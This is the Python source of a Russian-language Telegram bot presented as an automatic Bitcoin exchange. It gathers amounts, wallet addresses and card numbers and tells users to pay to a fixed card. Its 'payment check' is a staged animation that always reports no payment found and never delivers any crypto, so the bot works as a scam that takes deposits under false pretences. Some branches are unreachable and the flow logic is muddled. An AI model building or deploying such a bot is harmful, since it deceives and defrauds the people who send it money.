from multiprocessing.resource_sharer import stop
from tabnanny import check
import telebot
import random
import time
import handlers.config as cfg
from telebot import *
import handlers.btcPrice as btc
import handlers.validation as valid

token = cfg.BOT_TOKEN
bot = telebot.TeleBot(token)

summary = 0

# * START KEYBOARD
startKeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
startKeyboard.row("⬇️ Список криптовалют ⬇️")
startKeyboard.row("🔄 История операций ", "🎁 Правила обмена")
startKeyboard.row("💰 Актуальные цены", "📖 Поддержка")

# * CANCEL KEYBOARD
cancelKeyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
cancelKeyboard.row("🚫 Отменить")



@bot.message_handler(content_types='text')
def startMSG(message):        
    bot.send_message(message.chat.id, reply_markup=startKeyboard, text=f"""⭕️ Добро пожаловать в автоматический обменный пункт {cfg.BOT_NAME}!""", parse_mode='html') 

    bot.register_next_step_handler(message, checkCommand, True)

def checkCancel(message):
    if message.text == "🚫 Отменить":
        return True
    else: 
        pass

def checkCommand(message, start_msg):
    if message.text == "✅ Оплата отправлена":

        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, text=f"""*🔍 Проверка оплаты...*""", parse_mode="Markdown")
        time.sleep(0.8)
        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 1, text=f"""*🔎 Проверка оплаты...*""", parse_mode="Markdown")       
        time.sleep(0.8)
        bot.delete_message(message.chat.id, message_id=message.message_id + 1)
        bot.send_message(chat_id=message.chat.id, reply_markup=keyboard, text=f"""*❌ Оплата не обнаружена. Повторите проверку через 5 минут!*""", parse_mode="Markdown")

    if checkCancel(message):
        startMSG(message)
        return False

    if message.text == "⬇️ Список криптовалют": # TODO 
        keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)

        # добавляем выбор валюты
        rub = types.InlineKeyboardButton('Ввести сумму в рублях', callback_data='buyBTC_RUB')
        btc = types.InlineKeyboardButton('Ввести количество BTC', callback_data='buyBTC_BTC')

        keyboard.add(btc, rub)

        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"⬇️ Купить BTC")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""🔄 Курс обмена: {cfg.BTC_BUY_PRICE} → 1 BTC
💵 Минимальная сумма: {cfg.MIN_SUM_BTC} BTC
💵 Максимальная сумма: {cfg.MAX_SUM_BTC} BTC""")


    elif message.text == "💰 Актуальные цены": # TODO 
        keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)

        # добавляем выбор валюты
        rub = types.InlineKeyboardButton('Продать в рублях', callback_data='sellBTC_RUB')
        btc = types.InlineKeyboardButton('Продать в BTC', callback_data='sellBTC_BTC')

        keyboard.add(btc, rub)

        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"⬆️ Продать BTC")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""🔄 Курс обмена: {cfg.BTC_SELL_PRICE} → 1 BTC
💵 Минимальная сумма: {cfg.MIN_SUM_BTC} BTC
💵 Максимальная сумма: {cfg.MAX_SUM_BTC} BTC""")


    elif message.text == "🔄 История операций":
        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""🔄 История обменов

[Список обменов пуст]""")

        # TODO ФУНКЦІОНАЛ ВИВЕДЕННЯ ІСТОРІЇ

    elif message.text == "🎁 Правила обмена":
        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""{cfg.RULES}""")


    elif message.text == "💰 Актуальные цены":         # TODO 
        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""{cfg.DESCRIPTION}""")

    elif message.text == "📖 Поддержка":
        bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""📖 Поддержка

Если у вас возникли какие-либо сложности при работе с ботом, либо Вы хотели бы задать нам вопрос – наш оператор с радостью поможет Вам разобраться.

{cfg.SUPPORT} (свободный график по выходным)""")

    elif start_msg == True:
        bot.send_message(message.chat.id, reply_markup=startKeyboard, text=f"""⭕️ Воспользуйтесь клавиатурой!""")
        bot.register_next_step_handler(message, checkCommand, True)
    else:
        startMSG(message)













def exchangeCryptoStady(message, currency, action, updating):
    if checkCancel(message):
        startMSG(message)
        return False

    if action == "BUY":
        if currency == "BTC":
            if valid.checkSum(cfg.MIN_SUM_BTC, cfg.MAX_SUM_BTC, message.text) or updating:
                bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""💬 Укажите Ваш адрес BTC для зачисления""")
                bot.register_next_step_handler(message, checkPayInfoStady, message.text, "BTC", "BUY")

            else:
                bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""Минимальная сумма для обмена {cfg.MIN_SUM_BTC} btc
Максимальная сумма для обмена {cfg.MAX_SUM_BTC} btc""")
                bot.register_next_step_handler(message, exchangeCryptoStady, currency, "BUY", False)


        if currency == "RUB":
            if valid.checkSum(cfg.MIN_SUM_RUB, cfg.MAX_SUM_RUB, message.text) or updating:
                bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""💬 Укажите Ваш адрес BTC для зачисления""")
                bot.register_next_step_handler(message, checkPayInfoStady, message.text, "RUB", "BUY")

            else:
                bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""Минимальная сумма для обмена {cfg.MIN_SUM_RUB} руб
Максимальная сумма для обмена {cfg.MAX_SUM_RUB} руб""")
                bot.register_next_step_handler(message, exchangeCryptoStady, currency, "BUY", False)
    



    if action == "SELL":
        if currency == "BTC":
            if valid.checkSum(cfg.MIN_SUM_BTC, cfg.MAX_SUM_BTC, message.text) or updating:
                bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""💬 Укажите номер карты для зачисления""")
                bot.register_next_step_handler(message, checkPayInfoStady, message.text, "BTC", "SELL")

            else:
                bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""Минимальная сумма для обмена {cfg.MIN_SUM_BTC} btc
Максимальная сумма для обмена {cfg.MAX_SUM_BTC} btc""")
                bot.register_next_step_handler(message, exchangeCryptoStady, currency, "SELL", False)


        if currency == "RUB":
            if valid.checkSum(cfg.MIN_SUM_RUB, cfg.MAX_SUM_RUB, message.text) or updating:
                bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""💬 Укажите номер карты для зачисления""")
                bot.register_next_step_handler(message, checkPayInfoStady, message.text, "RUB", "SELL")

            else:
                bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""Минимальная сумма для обмена {cfg.MIN_SUM_RUB} руб
Максимальная сумма для обмена {cfg.MAX_SUM_RUB} руб""")
                bot.register_next_step_handler(message, exchangeCryptoStady, currency, "SELL", False)








def checkPayInfoStady(message, summ, currency, action):
    print("checkPayInfoStady")
    if checkCancel(message):
        startMSG(message)
        return False

    global summary
    # в душе не ебу как работает ( разбирайся сам )
    try:
        if summary == 0:
            summary = float(summ)
    except:
        exchangeCryptoStady(message, currency, "BUY", True)
        

    if action == "BUY":
        print(currency)
        if valid.validateBTC(message.text):
            if currency == "RUB":
                print(f"{currency} next - pay stady")
                payStady(message, summary, "RUB", "BUY")
            if currency == "BTC":
                print(f"{currency} next - pay stady")
                payStady(message, summary, "BTC", "BUY")
        
        else:            
            bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""⚠️ Такого BTC кошелька не существует!""")
            exchangeCryptoStady(message, currency, "BUY", True)

    if action == "SELL":
        print(currency)
        if valid.validateCard(message.text):
            if currency == "RUB":
                print(f"{currency} next - pay stady")
                payStady(message, summary, "RUB", "SELL")
            if currency == "BTC":
                print(f"{currency} next - pay stady")
                payStady(message, summary, "BTC", "SELL")

        else:
            bot.send_message(message.chat.id, reply_markup=cancelKeyboard, text=f"""⚠️ Неверно введен номер карты!""")
            exchangeCryptoStady(message, currency, "SELL", True)








def payStady(message, summ, currency, action):
    if checkCancel(message):
        startMSG(message)
        return False

    global summary
    #! BUY BTC
    if valid.validateBTC(message.text) and currency == "BTC" and action == "BUY":        
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""✅ Заявка {str(random.randrange(100, 40000)).zfill(6)} успешно создана!

💵 Сумма к получению: {summ} Btc
🏦 Счёт зачисления:
{message.text}

⏺️ Статус заявки:  🟡 Ожидает оплаты

🕓 Время на оплату:  30 минут
💵 Сумма к оплате: `{btc.buyBTC_inBTC(summ)}` Руб
🏦 Реквизиты для оплаты: `{cfg.CARD_NUMBER}`""", parse_mode="Markdown")


    elif valid.validateCard(message.text) and currency == "RUB" and action == "BUY":        
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""✅ Заявка {str(random.randrange(100, 40000)).zfill(6)} успешно создана!

💵 Сумма к получению: {btc.buyBTC_inRUB(summ)} Btc
🏦 Счёт зачисления:
{message.text}

⏺️ Статус заявки:  🟡 Ожидает оплаты

🕓 Время на оплату:  30 минут
💵 Сумма к оплате: `{summ}` Руб
🏦 Реквизиты для оплаты: `{cfg.CARD_NUMBER}`""", parse_mode="Markdown")

    #! SELL BTC
    elif valid.validateBTC(message.text) and currency == "BTC" and action == "SELL":        
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""✅ Заявка {str(random.randrange(100, 40000)).zfill(6)} успешно создана!

💵 Сумма к получению: {summ} Btc
🏦 Счёт зачисления:
{message.text}

⏺️ Статус заявки:  🟡 Ожидает оплаты

🕓 Время на оплату:  30 минут
💵 Сумма к оплате: {btc.buyBTC_inBTC(summ)} Руб
🏦 Реквизиты для оплаты: {cfg.CARD_NUMBER}""")


    elif valid.validateCard(message.text) and currency == "RUB" and action == "SELL":        
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""✅ Заявка {str(random.randrange(100, 40000)).zfill(6)} успешно создана!

💵 Сумма к получению: {summ} Btc
🏦 Счёт зачисления:
{message.text}

⏺️ Статус заявки:  🟡 Ожидает оплаты

🕓 Время на оплату:  30 минут
💵 Сумма к оплате: {btc.buyBTC_inBTC(summ)} Руб
🏦 Реквизиты для оплаты: {cfg.CARD_NUMBER}""")


    else:
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""✅ Заявка {str(random.randrange(100, 40000)).zfill(6)} успешно создана!

💵 Сумма к получению: {summ} Btc
🏦 Счёт зачисления:
{message.text}

⏺️ Статус заявки:  🟡 Ожидает оплаты

🕓 Время на оплату:  30 минут
💵 Сумма к оплате: {btc.buyBTC_inBTC(summ)} Руб
🏦 Реквизиты для оплаты: {cfg.CARD_NUMBER}""")

        print(valid.validateCard(message.text))
        print(currency)
        print(action)

    summary = 0
    bot.register_next_step_handler(message, checkPayment)




def checkPayment(message):
    if checkCancel(message):
        startMSG(message)

        return False
    if message.text == "✅ Оплата отправлена":
        print("F")
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, text=f"""*🔍 Проверка оплаты...*""", parse_mode="Markdown")
        time.sleep(0.8)
        bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id + 1, text=f"""*🔎 Проверка оплаты...*""", parse_mode="Markdown")       
        time.sleep(0.8)
        bot.delete_message(message.chat.id, message_id=message.message_id + 1)
        bot.send_message(chat_id=message.chat.id, reply_markup=keyboard, text=f"""*❌ Оплата не обнаружена. Повторите проверку через 5 минут!*""", parse_mode="Markdown")
        bot.register_next_step_handler(message, checkPayment)

    else:
        keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        keyboard.row("✅ Оплата отправлена","🚫 Отменить")

        bot.send_message(message.chat.id, reply_markup=keyboard, text=f"""⭕️ Воспользуйтесь клавиатурой!""") 
        bot.register_next_step_handler(message, checkPayment)


@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.message:
        if call.data == ('buyBTC_BTC'):
            bot.send_message(call.message.chat.id, reply_markup=cancelKeyboard, text=f"""Текущий курс биткоина {cfg.SELL_PRICE} в рублях. 

Минимальное количество {cfg.MIN_SUM_BTC} btc.
Максимум {cfg.MAX_SUM_BTC} btc.

💬 Введите количество BTC для обмена""")
            bot.register_next_step_handler(call.message, exchangeCryptoStady, "BTC", "BUY", False)

        if call.data == ('buyBTC_RUB'):
            bot.send_message(call.message.chat.id, reply_markup=cancelKeyboard, text=f"""Текущий курс биткоина {cfg.SELL_PRICE} в рублях. 

Минимальное количество {cfg.MIN_SUM_RUB} рублей.
Максимум {cfg.MAX_SUM_RUB} рублей.

💬 Введите количество рублей для обмена""")
            bot.register_next_step_handler(call.message, exchangeCryptoStady, "RUB", "BUY", False)

        if call.data == ('sellBTC_BTC'):
            bot.send_message(call.message.chat.id, reply_markup=cancelKeyboard, text=f"""Текущий курс биткоина {cfg.SELL_PRICE} в рублях. 

Минимальное количество {cfg.MIN_SUM_BTC} btc.
Максимум {cfg.MAX_SUM_BTC} btc.

💬 Введите количество BTC для обмена""")
            bot.register_next_step_handler(call.message, exchangeCryptoStady, "BTC", "SELL", False)

        if call.data == ('sellBTC_RUB'):
            bot.send_message(call.message.chat.id, reply_markup=cancelKeyboard, text=f"""Текущий курс биткоина {cfg.SELL_PRICE} в рублях. 

Минимальное количество {cfg.MIN_SUM_RUB} рублей.
Максимум {cfg.MAX_SUM_RUB} рублей.

💬 Введите количество рублей для обмена""")
            bot.register_next_step_handler(call.message, exchangeCryptoStady, "RUB", "SELL", False)

if __name__ == '__main__':
    bot.infinity_polling()